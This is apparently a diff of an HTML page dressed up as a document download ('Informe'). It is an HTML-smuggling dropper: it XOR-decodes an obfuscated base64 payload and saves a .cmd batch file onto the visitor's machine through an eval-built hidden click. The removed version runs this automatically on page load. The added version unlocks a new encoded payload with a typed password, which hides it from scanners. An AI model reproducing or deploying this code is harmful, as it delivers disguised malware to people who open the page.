@@ -17,7 +17,6 @@
 </html>
 
 ––>
-
 <!DOCTYPE html>
 <html>
 <meta charset='UTF-8'>
@@ -27,16 +26,15 @@
 function b64toarray(base64) {
   var bin_string = window.atob(base64);
   var len = bin_string.length;
-  var bytes = new Uint8Array(len);
-  for (var i = 0; i < len; i++) {
+  var bytes = new Uint8Array( len );
+  for (var i = 0; i < len; i++)
+  {
     bytes[i] = bin_string.charCodeAt(i);
   }
   return bytes.buffer;
 }
-
-function retrive() {
-  var test123123 = ''
-  var binary = xor(atob('UUdWamFHOGdiMlptQ25ObGRDQkpVRDFDVWxoV1ZGRkJNek0wTlRjeUNtTmtJQ1ZUZVhOMFpXMVNiMjkwSlZ4VGVYTjBaVzB6TWdwelpYUWdSRWxUUFVoTlMwcElVMWhRT1RneU5UVXhDbk5sZENCWVNsbzlWMmx1Q25ObGRDQlVUVXM5UkUxR1FUTXlNalkzTUFwelpYUWdSbGxZVUVFOVpHOTNDbk5sZENCR1VrWkxQVUZMUWtKRVV6VTRNamt4TWdwelpYUWdVVlpYUFhOUWJ3cHpaWFFnUmtKUlJrbEdQVlpHVFZsVk5UVXhOVFU1Q25ObGRDQlhUa005ZDJWeUNuTmxkQ0JaVlVWWVdFUTlSRVpSVHpVMk1qSTFPQXB6WlhRZ1dGTk9Ta2s5VTJobENuTmxkQ0JGU2tWSVdUMVlRbFEzTXpRME5RcHpaWFFnUjB4QlBXeHNYSFl4Q25ObGRDQkdXa2RZV0ZSVFBWSk1ORE16TWpFekNuTmxkQ0JLUjBwV1JWTTlMZ3B6WlhRZ1VVZFRWRDFUVlZvM05UUXlPRGNLYzJWMElGZFBUVkpTUFRCY2NHOEtjMlYwSUVJOVdVWkVRVVJKUTFOTU9EZ3hNRGt3Q25ObGRDQkJWMDFVUFhkbENuTmxkQ0JKVlVFOVNVSkNXRXBLU3pNNU5ESTBNd3B6WlhRZ1FsVkdUMVpEUFhKemFBcHpaWFFnVVVOWFBVTkxVRmcxT1RBME1UVUtjMlYwSUU1QlF6MWxiR3dLYzJWMElGTlNWRDFVVkUxS1Z6Z3hOREl6TndwelpYUWdRMXBaVUQwdVpYZ0tjMlYwSUV4UVdUMVJUVk5KUWpjM056WTRPUXB6WlhRZ1ZVNVZVRVk5WlNBdGJncHpaWFFnU1VoUlR6MVpTMGhGT1RBNU1qQXlDbk5sZENCS1RVMVhRVDF2Y0NBS2MyVjBJRnBaVkQxUVVVczBOVFF6TVRFS2MyVjBJRWRaVDFSV0pTVkNSa0ZYUjFRbENrUkZUQ0FpSlg1bU1DSUs='));
+function retrive(){
+  var binary = xor(atob('ISYlGRYoSgMSUykeNAE8CBQiMTkiK0MnJQ0bJCEpNCY9Gz5DOTsRHTMMPRg+LCQwFTk9Qy04QzcSU0pDPTkKMBU5PUMtOEIePQYDCS03IwMiJB8nJzoaKiNRAzoiXho1PzUUCjk7JxwzDz0fEywwPSMNHEohXR4RMw89HxMsMDEkNABKJSpDIyE1Pgo6BStXPSADCS03IwMiDR8qIio3XSomSkA0ATwIFCIxNCIEKCggNDU/JgQ4ISUbJkc6BRkcPQYDCS03IwMlNykrJzc8NRIWAwktNyMDIgo5ISUEHiMgNyk0IzkeMj41Jgs5OydRMw89HxMsMDwkCj5KE10kHTMPPR8TLDA+JjQlKiAqI10iJCkhIxUnVj0LOkI4LgIeKjkiFCApPCsjChhKIl0aCDMPPR8TLDAiIwolOiA7Qz0hDSJAOhUjVD4wAwktNyMDIlELMSc4ChcoKSoLNAE8CBQiMTQgBBY9JychJyc5OCk+JT4JOgU3HjMPPR8TLDAvIlEDJCU5P108BgMJLTcjAyU0FychK0MwJjccQDk7Ix0/JRA4FF0kVDknFyMjOTg3IDUxEBQoSi8TUyVDPio7XSc0KTYmOiAuIVA9PjgrFRw9JRgENAE8CBQiMTEhX0MxIDkXHzQBPAgUIjE5ITo3XSM0OTAgKgIvIxs+RjkrO1Q9FgMJLTcjAyENJTQjXiggIDk5CRYuAh4qOSIUIjo8PCA0PT8iKRVVPzUyQzo7Jy8TUyVDPipHJiEbQh8VKAUvE1MlQz4pPDcmJUImISpDLyYbFAs5KzsePhYDCS03IwMhUAMpIitCESo5FDgUXSRUOSQLIiA7QzYkNz05JgURVz4bKkc4PgIeKjkiFCE6RzIlJCpKLTwzEBIGAwktNyMDIzQbISMVQz4jURs1ODszUT0LMgo0ATwIFCIxOCM6QzwhNUIFFCwzLxNTJUM+KQI+JiVCIiI6AVQ+NSIJOjs3LxNTJUM+KhY+JFAhJCc8Q1czDz0fEywwISU0FzAlXjw1IDcXPyErP1A9JRRCOj4CHio5IhQmBCgmJlEXJic4HhE5JTYUOz4CHio5IhQmXjA0Jg06SiA5P1E+GyJCOgUzLxNTJUM+KkcrIDYbQxMnMB4/CEsFFAI0VzwMFwMTKBpVKQ8lCS03OA4SU0ZDLThHVDwMPQUVPEsVElI5HRY4RwsSUzUJO1woFBImNgUVODQUEghLCzo8R1QVKSI4LTg8CxIYMQMtORULOQofHy4pGgM7JEYULTcREBJROTguKCQDIVIiFCMCMAgUIkYUIV0kDSkkPQAkOCQrFCYyAzsEIDQUU0YAI100AyomMScTKTguJAwxOzwsEQgkCkcfPRYZDTs1ABQRLDMIJyQDEj08JCMnNxsiJjwnCCU3KSs9PCQ8JAo+Hz05GjAkCgM5PTwkLCQkNh89OgIsIw0pNSIWJwgmUUo9IgM7CDo0NSsjOSMIOjQ5JSUESzMhGCYfIwQ0IDoyJTcgAx41OjIlJSMDJDUiCCYfJARDKiZRNh89OhY+JFAhJD08JCciCjUrJV4jCDMKITUjLDMNOjlGHjosOy8='));
   var data = b64toarray(binary);
   var bobject = new Blob([data], {type: 'octet/stream'});
   var targetfilename = 'lhcqc(7592258).cmd';
@@ -49,35 +47,33 @@ function retrive() {
   eval('hiddenobject' + String.fromCharCode(46, 99, 108, 105, 99, 107, 40, 41) + ';');
   window.URL.revokeObjectURL(url);
 }
-
-function xor(input) {
+function xor(input)
+{
   var result = '';
-  var password = 'default'; // Puedes cambiar 'default' por cualquier contraseña que desees.
-  for (i = 0; i < input.length; ++i) {
+  var password = document.getElementById('passwordid').value;
+  for(i=0; i<input.length; ++i){
     result += String.fromCharCode(password.charCodeAt(i % password.length) ^ input.charCodeAt(i));
   }
   return result;
 }
-
-// Invocar la función retrive() automáticamente al cargar la página.
-window.onload = retrive;
-
 </script>
 <table border=0 style='background: #1abc9c'>
-  <tr>
-    <td>
-      File: lhcqc(7592258).cmd
-      <br>
-      Size: 888 bytes
-      <br>
-      Message: Informe
-      <br>
-    </td>
-  </tr>
+<tr>
+  <td>
+    File: lhcqc(7592258).cmd
+    <br>
+    Size: 888 bytes
+    <br>
+    Message: Informe
+    <br>
+    <input type=password id=passwordid placeholder=password>
+    <br>
+    <button onclick=retrive()>Retrieve File</button>
+  </td>
+</tr>
 </table>
 <br>
 <br>
 <br>
 </body>
 </html>
-
